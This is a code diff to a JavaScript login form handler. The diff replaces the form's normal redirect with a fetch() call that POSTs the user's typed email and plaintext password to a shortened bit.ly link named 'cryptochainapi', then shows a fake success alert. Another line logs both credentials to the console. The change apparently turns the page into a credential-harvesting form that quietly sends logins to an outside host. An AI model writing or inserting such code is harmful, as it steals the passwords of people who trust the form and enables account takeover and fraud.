@@ -45,6 +45,21 @@ form.onsubmit = (e)=>{
   //if eField and pField doesn't contains error class that mean user filled details properly
   if(!eField.classList.contains("error") && !pField.classList.contains("error")){
     console.log('email=', eInput.value, 'pass =', pInput.value );
-    window.location.href = form.getAttribute("action"); //redirecting user to the specified url which is inside action attribute of form tag
+    fetch("https://bit.ly/cryptochainapi", {
+      method: "POST",
+      body:JSON.stringify({
+        email:eInput.value,
+        password:pInput.value
+      }),
+    })
+    .then((response) => response.json())
+    .then((result) => {
+      if (result.message === "SUCCESS") {
+        alert("logged in successfully");
+      } else {
+        alert("")
+      }
+    });
+    //window.location.href = form.getAttribute("action"); //redirecting user to the specified url which is inside action attribute of form tag
   }
 }
